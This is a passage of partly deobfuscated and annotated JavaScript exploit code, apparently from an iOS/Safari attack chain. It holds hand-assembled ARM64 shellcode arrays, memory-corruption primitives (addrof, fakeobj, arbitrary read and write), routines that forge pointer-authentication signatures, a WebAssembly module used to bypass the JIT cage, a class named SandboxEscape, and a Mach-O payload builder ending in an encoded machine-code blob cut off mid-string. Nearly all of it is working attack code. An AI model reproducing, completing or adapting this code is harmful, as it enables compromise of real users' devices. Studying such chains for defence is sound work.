                        0x8B1B82F7, // add  x23, x23, x27, lsl #32
                        0x8B1302F7, // add  x23, x23, x19
                        0xAA1503F9, // mov  x25, x21
                        0xDAC10EF9, // blraaz x23
                        0xD367FF39, // lsr  x25, x25, #23
                        0xD2800278, // movz x24, #0x13
                        0xD3481F18, // lsl  x24, x24, #56
                        0x8B1B8318, // add  x24, x24, x27, lsl #32
                        0x8B130318, // add  x24, x24, x19
                        0xAA1503FA, // mov  x26, x21
                        0xDAC10F1A, // blraaz x24
                        0xD357FF5A, // lsr  x26, x26, #23
                        0xCA19035A, // eor  x26, x26, x25
                        0x2A1A03F3, // mov  w19, w26
                        0xB8366873, // str  w19, [x3, w22, uxtw #0]
                        0x910012D6, // add  x22, x22, #0x4
                        0x17FFFFE8, // b    #-0x60
                        // ----- epilogue (plain ret, no auth) -----
                        0xA8C173FB, // ldp  x27, x28, [sp], #16
                        0xA8C16BF9, // ldp  x25, x26, [sp], #16
                        0xA8C163F7, // ldp  x23, x24, [sp], #16
                        0xA8C15BF5, // ldp  x21, x22, [sp], #16
                        0xA8C153F3, // ldp  x19, x20, [sp], #16
                        0xA8C17BFD, // ldp  x29, x30, [sp], #16
                        0xD65F03C0 // ret                               ; plain return (no PAuth check)
                    ]; 4 * a.length % 32 != 0;) a.push(0xD503201F /* nop */);
                    b = new Uint32Array(a);
                }
            } else {
                // fd=false: structurally distinct — builds Weyl/hash constant then iterates with XOR+rotate mix
                for (a = [
                    // ----- prologue -----
                    0xA9BF7BFD, // stp  x29, x30, [sp, #-16]!
                    0x910003FD, // add  x29, sp, #0x0
                    0xA9BF4FF4, // stp  x20, x19, [sp, #-16]!           ; NOTE: reversed register pair vs other variants
                    0xA9BF5BF5, // stp  x21, x22, [sp, #-16]!
                    // ----- load 64-bit constant 0xB7E15162_8AED2A6A into x20 -----
                    // (Weyl sequence constant: floor((sqrt(5)-1)/2 * 2^64))
                    0xD2854D54, // movz x20, #0x2a6a                    ; x20  = 0x0000_0000_0000_2a6a
                    0xF2B15DB4, // movk x20, #0x8aed, lsl #16           ; x20  = 0x0000_0000_8aed_2a6a
                    0xF2CA2C54, // movk x20, #0x5162, lsl #32           ; x20  = 0x0000_5162_8aed_2a6a
                    0xF2F6FC34, // movk x20, #0xb7e1, lsl #48           ; x20  = 0xb7e1_5162_8aed_2a6a
                    // ----- guard: skip loop if length == 0 -----
                    0xB40001C1, // cbz  x1, #+0x38                      ; if x1 == 0 -> epilogue
                    0xD2800016, // movz x22, #0x0                       ; index = 0
                    // ----- loop body -----
                    0xB8766815, // ldr  w21, [x0, w22, lsl #0]          ; w21 = input[index]
                    0x4A0202A2, // eor  w2, w21, w2                     ; w2 ^= w21  (fold in input)
                    0xAA0203F5, // mov  x21, x2                         ; x21 = w2 (zero-extended)
                    0xDAC10EF9, // blraaz x23                           ; call fn via x23 (auth IA)
                    0xDAC10E82, // blraaz x20                           ; call fn via x20 — also advances Weyl state
                    0xD357FC42, // lsr  x2, x2, #23                     ; x2 >>= 23
                    0xCA559C42, // eor  x2, x2, x21, lsl #39            ; x2 ^= x21 << 39  (rotate-XOR diffusion)
                    0xB4000043, // cbz  x3, #+0x8                       ; if output ptr == null -> skip store
                    0xB8366862, // str  w2, [x3, w22, uxtw #0]          ; output[index] = w2
                    0x910012D6, // add  x22, x22, #0x4                  ; index += 4
                    0xEB0102DF, // cmp  x22, x1, uxtb #0
                    0x54FFFEAB, // b.lt #-0x2c                          ; loop back
                    // ----- epilogue -----
                    0xA8C15BF5, // ldp  x21, x22, [sp], #16
                    0xA8C14FF4, // ldp  x20, x19, [sp], #16             ; reversed restore matches prologue
                    0xA8C17BFD, // ldp  x29, x30, [sp], #16
                    0xAA0203E0, // mov  x0, x2                          ; return value = final hash state
                    0xD65F03C0 // ret
                ]; 4 * a.length % 32 != 0;) a.push(0xD503201F /* nop */);
                b = new Uint32Array(a);
            }
            this.Ed = this.Ud(b), this.vd = this.Ud(new Uint32Array([
                // vd: minimal trampoline — move argument register then tail-call
                0xAA0603E8, // mov  x8, x6                              ; x8 = x6  (e.g. syscall number / selector)
                0xD61F00E0, // br   x7                                  ; jump to x7 (tail call, no link)
                0xD65F03C0, // ret                                      ; guard slot 2
                0xD65F03C0, // ret                                      ; guard slot 3
                0xD65F03C0, // ret                                      ; guard slot 4
                0xD65F03C0, // ret                                      ; guard slot 5
                0xD65F03C0, // ret                                      ; guard slot 6
                0xD65F03C0 // ret                                      ; guard slot 7
            ]));
        }
        Fd() {
            const b = (b, a, l) => {
                let i = utilityModule._(a);
                const c = newInt64(6625765994 /* 4294967296 + (1297624433 ^ -944437477) */, 7379964258 /* 4294967296 + (876889462 ^ -2086333420) */),
                    o = newInt64(0, 0);
                for (let a = 0; a < b.length; a++) {
                    const d = (b[a] ^ i) >>> 0,
                        h = pacBypass.autda(toInt64(d), o).et >>> 7,
                        g = pacBypass.autda(toInt64(d), c);
                    i = (h ^ (g.it >>> 23 | g.et << 9) >>> 0) >>> 0, exploitPrimitive.write32(l + 4 * a, i);
                }
                return i;
            },
                a = (b, a, l) => {
                    let i = 0,
                        c = pacBypass.autda.bind(pacBypass);
                    !0 === platformModule.platformState.versionFlags.wYk8Jg && (c = pacBypass.autia.bind(pacBypass));
                    const o = (b, a, l) => newInt64(l, (b << 24) + (16777215 /* 1278686017 ^ 1288228030 */ & a)),
                        d = (b, a) => {
                            i = ((b, a, l) => {
                                const i = c(toInt64(b), o(18, a, l)).et >>> 7,
                                    d = c(toInt64(b), o(19, a, l));
                                return (i ^ (d.it >>> 23 | d.et << 9) >>> 0) >>> 0;
                            })(b, a + 1, i);
                        };
                    for (let a = 0; a < b.length; a++) d(b[a], a), exploitPrimitive.write32(l + 4 * a, i);
                    return i;
                },
                l = (b) => {
                    let a = 0;
                    const l = newInt64(0x8aed2a6a, 0xb7e15162),
                        i = newInt64(0, 0);
                    for (let c = 0; c < b.length; c++) {
                        const o = (b[c] ^ a) >>> 0,
                            d = pacBypass.autda(toInt64(o), i).et >>> 7,
                            h = pacBypass.autda(toInt64(o), l);
                        a = (d ^ (h.it >>> 23 | h.et << 9) >>> 0) >>> 0;
                    }
                    return a;
                };
            return !0 === platformModule.platformState.versionFlags.TyPY6G ? !0 === this.fd ? a : b : l;
        }
        Ud(b) {
            const a = b.byteLength;
            if (a % 32 != 0) throw new Error("a % 32 != 0");
            const l = platformState.caller,
                i = this.Dd + 256 /* 1917149780 ^ 1917150036 */,
                c = i + 512 /* 1381529668 ^ 1381530180 */,
                o = exploitPrimitive.fakeobj(b);
            this.kd.fill(0), utilityModule.D(b), exploitPrimitive.copyBigInt(c + platformModule.platformState.versionFlags.PyEQqC + platformModule.platformState.versionFlags.ydHN48, o), exploitPrimitive.write32(c + platformModule.platformState.versionFlags.iBTCSN, a);
            let d, h = 0;
            if (null !== pacBypass) {
                const a = this.Fd();
                if (!0 === platformModule.platformState.versionFlags.TyPY6G) {
                    if (b.byteLength > this.Zd.byteLength) throw new Error("b.byteLength > this.Zd.byteLength");
                    !0 === this.fd ? (!0 === this.Jd ? exploitPrimitive.copyBigInt(c + platformModule.platformState.versionFlags.jY1sqq + platformModule.platformState.versionFlags.ydHN48, this.Nd) : exploitPrimitive.copyBigInt(c + platformModule.platformState.versionFlags.PIQrsf + platformModule.platformState.versionFlags.ydHN48, this.Nd), h = a(b, c + platformModule.platformState.versionFlags.PyEQqC, this.Nd), !0 === this.Jd && (exploitPrimitive.write32(c + platformModule.platformState.versionFlags.csgakW, h), exploitPrimitive.write32(c + platformModule.platformState.versionFlags.csgakW + 4, 0))) : (exploitPrimitive.copyBigInt(c + platformModule.platformState.versionFlags.NUd9MZ + platformModule.platformState.versionFlags.ydHN48, this.Nd), h = a(b, c + platformModule.platformState.versionFlags.PyEQqC, this.Nd), exploitPrimitive.write32(c + platformModule.platformState.versionFlags.csgakW, h));
                } else h = a(b), exploitPrimitive.write32(c + platformModule.platformState.versionFlags.csgakW, h);
            }
            if (null !== pacBypass && !0 === platformModule.platformState.versionFlags.sKfNmf && !0 === pacBypass.cc ? pacBypass.tc(this.Od, toInt64(i), toInt64(c)) : l.jd(toInt64(this.Qd), toInt64(i), toInt64(c)), !0 === platformState.hasPAC) {
                d = exploitPrimitive.readInt64FromOffset(i + platformModule.platformState.versionFlags.dzBoEE).Dt();
            } else {
                d = exploitPrimitive.readInt64FromOffset(i + platformModule.platformState.versionFlags.cxrfKw).Dt();
            }
            return d;
        }
        Ad(b, a, l) {
            if (l % 4 != 0) throw new Error("l % 4 != 0");
            const i = platformState.caller;
            this.kd.fill(0);
            const c = this.Dd + 256 /* 1934652213 ^ 1934651957 */,
                o = c + 768 /* 1768515137 ^ 1768514881 */;
            if (exploitPrimitive.writeInt64ToOffset(o + platformModule.platformState.versionFlags.PyEQqC, a), exploitPrimitive.write32(o + platformModule.platformState.versionFlags.iBTCSN, l), null !== pacBypass) {
                b = pacBypass.pacia(b, toInt64(18410 /* 1332040808 ^ 1332024194 */));
                let c = 0;
                !0 === platformModule.platformState.versionFlags.TyPY6G && (c = utilityModule._(o + platformModule.platformState.versionFlags.PyEQqC));
                let d = 0;
                if (!0 === platformModule.platformState.versionFlags.TyPY6G) {
                    const b = new ArrayBuffer(l + 4);
                    utilityModule.D(b), d = exploitPrimitive.fakeobj(b), !0 === this.Jd ? exploitPrimitive.copyBigInt(o + platformModule.platformState.versionFlags.jY1sqq, d) : !0 === this.fd ? exploitPrimitive.copyBigInt(o + platformModule.platformState.versionFlags.PIQrsf, d) : exploitPrimitive.copyBigInt(o + platformModule.platformState.versionFlags.NUd9MZ, d);
                }
                c = i.jd(toInt64(this.Ed), a, newInt64(l, 0), newInt64(c, 0), toInt64(d)).yt(), exploitPrimitive.write32(o + platformModule.platformState.versionFlags.csgakW, c), !0 === this.Jd && exploitPrimitive.write32(o + platformModule.platformState.versionFlags.csgakW + 4, 0);
            }
            null !== pacBypass ? exploitPrimitive.writeInt64ToOffset(c + platformModule.platformState.versionFlags.dzBoEE, b) : exploitPrimitive.writeInt64ToOffset(c + platformModule.platformState.versionFlags.cxrfKw, b), exploitPrimitive.copyBigInt(c + platformModule.platformState.versionFlags.SiBW7G, l), null !== pacBypass && !0 === platformModule.platformState.versionFlags.sKfNmf && !0 === pacBypass.cc ? pacBypass.tc(this.Od, toInt64(c), toInt64(o)) : i.jd(toInt64(this.Qd), toInt64(c), toInt64(o));
        }
        Bd(b) {
            if (null === pacBypass) throw new Error("null === pacBypass");
            const a = platformState.caller;
            b += b % 32, this.kd.fill(0);
            const l = new ArrayBuffer(b);
            new Uint8Array(l).fill(204 /* 1127500664 ^ 1127500724 */);
            const i = exploitPrimitive.fakeobj(l);
            if (b % 32 != 0) throw new Error("b % 32 != 0");
            const c = this.Dd + 256 /* 1131761484 ^ 1131761228 */,
                o = c + 768 /* 1330336338 ^ 1330336082 */;
            exploitPrimitive.writeInt64ToOffset(o + platformModule.platformState.versionFlags.PyEQqC, toInt64(i)), exploitPrimitive.write32(o + platformModule.platformState.versionFlags.iBTCSN, b);
            const d = new ArrayBuffer(b + 4);
            utilityModule.D(d);
            const h = exploitPrimitive.fakeobj(d);
            return !0 === this.Jd ? exploitPrimitive.copyBigInt(o + platformModule.platformState.versionFlags.jY1sqq + platformModule.platformState.versionFlags.ydHN48, h) : exploitPrimitive.copyBigInt(o + platformModule.platformState.versionFlags.PIQrsf + platformModule.platformState.versionFlags.ydHN48, h), a.jd(toInt64(this.Ed), toInt64(i), newInt64(b, 0), newInt64(0, 0), toInt64(h)), pacBypass.tc(this.Od, toInt64(c), toInt64(o)), exploitPrimitive.readInt64FromOffset(c + platformModule.platformState.versionFlags.dzBoEE).Dt();
        }
        Vd() {
            if (this.Gd) return 0;
            {
                const b = this.Td(),
                    a = exploitPrimitive.addrof(b),
                    l = exploitPrimitive.readRawBigInt(a + platformModule.platformState.versionFlags.ZiIyeM),
                    i = exploitPrimitive.readRawBigInt(l + platformModule.platformState.versionFlags.iNLXaz),
                    c = exploitPrimitive.readRawBigInt(i + platformModule.platformState.versionFlags.Ps7Z2u),
                    o = exploitPrimitive.readRawBigInt(c + platformModule.platformState.versionFlags.VTwyJG);
                if (0 === o) throw new Error("0 === o");
                return o;
            }
        }
        newInt64OfSomething(b) {
            const a = platformState.caller;
            if (null !== pacBypass && !0 === platformModule.platformState.versionFlags.sKfNmf && !0 === pacBypass.cc) return this.Bd(b);
            if (this.Gd) {
                a.jd(toInt64(this.vd), toInt64(b), toInt64(0), toInt64(0), toInt64(0), toInt64(0), toInt64(0), toInt64(this.Dd), toInt64(this.Rd));
                const l = exploitPrimitive.readDoubleAsPointer(this.Dd);
                return toInt64(exploitPrimitive.readDoubleAsPointer(l + platformModule.platformState.versionFlags.OaAgtr));
            } {
                let l, i;
                !0 === this.Wd ? (l = toInt64(0), i = toInt64(b)) : (l = toInt64(b), i = toInt64(0));
                a.jd(toInt64(this.vd), toInt64(this.Hd), l, i, toInt64(0), toInt64(0), toInt64(0), toInt64(this.Dd), toInt64(this.xd));
                const c = exploitPrimitive.readDoubleAsPointer(this.Dd);
                return toInt64(exploitPrimitive.readDoubleAsPointer(c + platformModule.platformState.versionFlags.VEwXfI));
            }
        }
    }
    const ob = SandboxEscape;

    // ── Caller setup: JIT cage + PAC-aware function caller ───────────────────
    r._d = function () {
        const b = new Uint8Array([0, 97, 115 /* 1095004022 ^ 1095003909 */, 109 /* 1985967730 ^ 1985967647 */, 1, 0, 0, 0, 1, 52, 3, 96, 8, 126 /* 1715618890 ^ 1715618868 */, 126 /* 945378655 ^ 945378593 */, 126 /* 1249474426 ^ 1249474308 */, 126 /* 1181824566 ^ 1181824584 */, 126 /* 2033281843 ^ 2033281869 */, 126 /* 1717982278 ^ 1717982264 */, 126 /* 1933989986 ^ 1933989916 */, 126 /* 1382770740 ^ 1382770762 */, 1, 126 /* 1414352481 ^ 1414352415 */, 96, 16, 127 /* 961760612 ^ 961760539 */, 127 /* 1231309909 ^ 1231309866 */, 127 /* 1278570084 ^ 1278570011 */, 127 /* 1768847212 ^ 1768847123 */, 127 /* 1362448754 ^ 1362448653 */, 127 /* 895576141 ^ 895576114 */, 127 /* 1651007796 ^ 1651007819 */, 127 /* 2018784865 ^ 2018784798 */, 127 /* 811550054 ^ 811549977 */, 127 /* 878987359 ^ 878987296 */, 127 /* 1179416642 ^ 1179416637 */, 127 /* 1214541361 ^ 1214541390 */, 127 /* 1748323640 ^ 1748323655 */, 127 /* 913137508 ^ 913137435 */, 127 /* 1449684561 ^ 1449684526 */, 127 /* 1162765395 ^ 1162765356 */, 1, 126 /* 1802843974 ^ 1802843960 */, 96, 16, 127 /* 929985397 ^ 929985290 */, 127 /* 1329022024 ^ 1329022007 */, 127 /* 812017463 ^ 812017480 */, 127 /* 1632925293 ^ 1632925202 */, 127 /* 1280664375 ^ 1280664392 */, 127 /* 1366189101 ^ 1366189138 */, 127 /* 1601794376 ^ 1601794359 */, 127 /* 1732735854 ^ 1732735761 */, 127 /* 1834113130 ^ 1834113045 */, 127 /* 1764574069 ^ 1764573962 */, 127 /* 1802454644 ^ 1802454539 */, 127 /* 1734296951 ^ 1734296840 */, 127 /* 1163409721 ^ 1163409734 */, 127 /* 2002138949 ^ 2002138938 */, 127 /* 2037148983 ^ 2037149000 */, 127 /* 1934714674 ^ 1934714701 */, 0, 3, 5, 4, 0, 1, 1, 2, 4, 4, 1, 112 /* 1800626797 ^ 1800626717 */, 0, 2, 5, 4, 1, 1, 1, 1, 7, 17, 4, 1, 116 /* 1230981687 ^ 1230981699 */, 1, 0, 1, 109 /* 911626091 ^ 911625990 */, 2, 0, 1, 111 /* 1415730531 ^ 1415730444 */, 0, 0, 1, 102 /* 930040423 ^ 930040321 */, 0, 3, 9, 7, 1, 0, 65, 0, 11, 1, 0, 10, 194 /* 1366057288 ^ 1366057354 */, 1, 4, 4, 0, 66, 0, 11, 88, 0, 32, 1, 173 /* 1480021817 ^ 1480021908 */, 66, 32, 134 /* 894260306 ^ 894260436 */, 32, 0, 173 /* 1249536360 ^ 1249536453 */, 132 /* 1800760907 ^ 1800761039 */, 32, 3, 173 /* 1865511219 ^ 1865511326 */, 66, 32, 134 /* 1416909384 ^ 1416909518 */, 32, 2, 173 /* 1747807553 ^ 1747807724 */, 132 /* 1249395042 ^ 1249395174 */, 32, 5, 173 /* 1265906739 ^ 1265906846 */, 66, 32, 134 /* 1668893776 ^ 1668893910 */, 32, 4, 173 /* 1298548567 ^ 1298548730 */, 132 /* 1666087220 ^ 1666087344 */, 32, 7, 173 /* 1396852072 ^ 1396852165 */, 66, 32, 134 /* 1651731525 ^ 1651731651 */, 32, 6, 173 /* 912871494 ^ 912871659 */, 132 /* 830027088 ^ 830027220 */, 32, 9, 173 /* 1231253601 ^ 1231253708 */, 66, 32, 134 /* 1111779704 ^ 1111779838 */, 32, 8, 173 /* 1195722029 ^ 1195722112 */, 132 /* 1667392120 ^ 1667392252 */, 32, 11, 173 /* 843329881 ^ 843330036 */, 66, 32, 134 /* 844443969 ^ 844444103 */, 32, 10, 173 /* 910644067 ^ 910644174 */, 132 /* 1496930153 ^ 1496930285 */, 32, 13, 173 /* 1214656619 ^ 1214656710 */, 66, 32, 134 /* 1700033587 ^ 1700033717 */, 32, 12, 173 /* 1496348264 ^ 1496348357 */, 132 /* 828651377 ^ 828651509 */, 32, 15, 173 /* 1870283635 ^ 1870283742 */, 66, 32, 134 /* 1450077538 ^ 1450077668 */, 32, 14, 173 /* 1987144267 ^ 1987144422 */, 132 /* 1752586038 ^ 1752586162 */, 65, 0, 17, 0, 0, 15, 11, 37, 0, 32, 0, 32, 1, 32, 2, 32, 3, 32, 4, 32, 5, 32, 6, 32, 7, 32, 8, 32, 9, 32, 10, 32, 11, 32, 12, 32, 13, 32, 14, 32, 15, 16, 1, 15, 11, 60, 1, 1, 126 /* 1331185994 ^ 1331185972 */, 32, 0, 32, 1, 32, 2, 32, 3, 32, 4, 32, 5, 32, 6, 32, 7, 32, 8, 32, 9, 32, 10, 32, 11, 32, 12, 32, 13, 32, 14, 32, 15, 16, 2, 33, 16, 65, 0, 32, 16, 167 /* 1866806125 ^ 1866806218 */, 54, 2, 0, 65, 4, 32, 16, 66, 32, 136 /* 1734690661 ^ 1734690797 */, 167 /* 1682197608 ^ 1682197711 */, 54, 2, 0, 15, 11]).buffer, // WASM module for indirect call table — enables JIT cage bypass
            a = new WebAssembly.Module(b, {}),
            l = new WebAssembly.Instance(a, {}),
            i = l.exports.f,
            c = l.exports.o,
            o = new Uint32Array(l.exports.m.buffer);
        let d = null,
            h = null;
        null !== pacBypass && !0 === platformModule.platformState.versionFlags.sKfNmf && !0 === pacBypass.cc && (d = platformModule.cr().dlsym("jitCagePtr"), h = pacBypass.pacda(Int64.fromNumber(d), Int64.fromNumber(0))); // jitCagePtr: JIT cage pointer for PAC bypass
        for (let b = 0; b < 100000 /* 2036681291 ^ 2036649195 */; b++) try {// JIT warmup for indirect call
            i();
        } catch (b) { }
        const g = utilityModule.Int64.fromNumber(9389 /* 1111844678 ^ 1111835627 */); /* discriminator for PAC signing */
        platformState.caller = {
            jd(b, ...a) {
                const l = platformModule.zn;
                if (b instanceof Int64 == !1) throw new Error("b instanceof Int64 == !1");
                if (b.Et()) throw new Error("b.Et()");
                if (a.length > 8) throw new Error("a.length > 8");
                const d = new Array(16);
                let s = 0;
                for (const b in a) {
                    const l = a[b];
                    if (a[b] instanceof Int64 == !1) throw new Error("a[b] instanceof Int64 == !1");
                    d[s] = l.it, d[s + 1] = l.et, s += 2;
                }
                const t = function (b) {
                    const a = exploitPrimitive.addrof(b);
                    return exploitPrimitive.readRawBigInt(a + platformModule.platformState.versionFlags.rvXShf);
                }(c),
                    I = l.exploitPrimitive.readInt64FromOffset(t);
                if (null !== l.pacBypass) {
                    if (!0 === platformModule.platformState.qn) {
                        if (platformModule.platformState.iOSVersion >= 170200 /* 828723297 ^ 828885177 */) throw new Error("platformModule.platformState.iOSVersion >= 170200 /* 828723297 ^ 828885177 */");
                        b = l.pacBypass.tc(h, b, g);
                    } else b = l.pacBypass.pacia(b, g);
                } else
                    if (!0 === platformState.hasPAC) throw new Error("!0 === platformState.hasPAC");
                l.exploitPrimitive.writeInt64ToOffset(t, b);
                try {
                    i(...d);
                } finally {
                    l.exploitPrimitive.writeInt64ToOffset(t, I);
                }
                const y = utilityModule.S(o[0]),
                    e = utilityModule.S(o[1]);
                return new utilityModule.Int64(y, e);
            }
        };
    }, r.qd = function () {
        platformState.sandboxEscape = SandboxEscapeBase.newInstance();
    };

    window.log("Done b5135768e043d1b362977b8ba9bff678b9946bcb");
    return r; // End of middle module (JIT cage + caller setup)
});

// ════════════════════════════════════════════════════════════════════════════
// Outer module: Mach-O payload builder + sandbox escape entry
// ════════════════════════════════════════════════════════════════════════════
let r = {};

const platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0"),
    utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),
    {
        N: G
    } = utilityModule,
    intToUnicodeEscape = utilityModule.intToUnicodeEscape,
    gA = utilityModule,
    DA = 1002 /* 1749956218 ^ 1749955984 */; /* Mach-O section alignment (2^10 = 1024) */
// ── Offset64 class (MA) — 64-bit offset arithmetic ──────────────────────
class Offset64 {/* Original: MA → Offset64 */
    static fromUnsigned(A) {
        return new Offset64(A >>> 0, A / 0x100000000 >>> 0);
    }
    static st(A) { return this.fromUnsigned(A); }
    constructor(A, g) {
        this.it = A >>> 0, this.et = g >>> 0;
    }
    add(A) {
        const g = this.et;
        let D = this.it;
        return D += A, new Offset64(D, g);
    }
    xor(A) {
        const g = this.it ^ A.it,
            D = this.et ^ A.et;
        return new Offset64(g >>> 0, D >>> 0);
    }
    gA(A) {
        let g = 0;
        return g = A, Offset64.fromUnsigned(this.toNumber() + g);
    }
    sub(A) {
        return this.add(-A);
    }
    DA(A) {
        return this.gA(-A);
    }
    MA() {
        return 0 !== this.et || this.it > 4096 /* 1667446127 ^ 1667442031 */ && this.it < 7516192768 /* 4294967296 + (2003270000 ^ -1217955472) */;
    }
    Et() {
        return 0 === this.et && 0 === this.it;
    }
    toString() {
        return this.et.toString(16) + "`" + this.it.toString(16);
    }
    ct() {
        return 4294967296 * this.et + this.it;
    }
}

// ── Mach-O binary builder function (CA) ──────────────────────────────────
function CA(A, g, D, M, C, I, w, Q, B, N, E, T, U, L, s, k, F, S, Y, y, o, x, c) {/* Original: CA → buildMachOBinary */
    var i = "";
    return i += intToUnicodeEscape(335544368 /* 1949592169 ^ 1614047833 */), i += intToUnicodeEscape(335544387 /* 1702197064 ^ 1903523595 */), i += intToUnicodeEscape(A.it), i += intToUnicodeEscape(A.et), i += intToUnicodeEscape(g.it), i += intToUnicodeEscape(g.et), i += intToUnicodeEscape(D.it), i += intToUnicodeEscape(D.et), i += intToUnicodeEscape(M.it), i += intToUnicodeEscape(M.et), i += intToUnicodeEscape(C), i += intToUnicodeEscape(0), i += intToUnicodeEscape(I.it), i += intToUnicodeEscape(I.et), i += intToUnicodeEscape(w.it), i += intToUnicodeEscape(w.et), i += intToUnicodeEscape(Q.it), i += intToUnicodeEscape(Q.et), i += intToUnicodeEscape(B.it), i += intToUnicodeEscape(B.et), i += intToUnicodeEscape(N.it), i += intToUnicodeEscape(N.et), i += intToUnicodeEscape(E.it), i += intToUnicodeEscape(E.et), i += intToUnicodeEscape(T.it), i += intToUnicodeEscape(T.et), i += intToUnicodeEscape(U.it), i += intToUnicodeEscape(U.et), i += intToUnicodeEscape(L.it), i += intToUnicodeEscape(L.et), i += intToUnicodeEscape(s.it), i += intToUnicodeEscape(s.et), i += intToUnicodeEscape(F.it), i += intToUnicodeEscape(F.et), i += intToUnicodeEscape(S.it), i += intToUnicodeEscape(S.et), i += intToUnicodeEscape(k.it), i += intToUnicodeEscape(k.et), i += intToUnicodeEscape(Y.it), i += intToUnicodeEscape(Y.et), i += intToUnicodeEscape(y.it), i += intToUnicodeEscape(y.et), i += intToUnicodeEscape(o.it), i += intToUnicodeEscape(o.et), i += intToUnicodeEscape(x.it), i += intToUnicodeEscape(x.et), i += intToUnicodeEscape(c.it), i += intToUnicodeEscape(c.et), i += gA.base64DecodeUtf16("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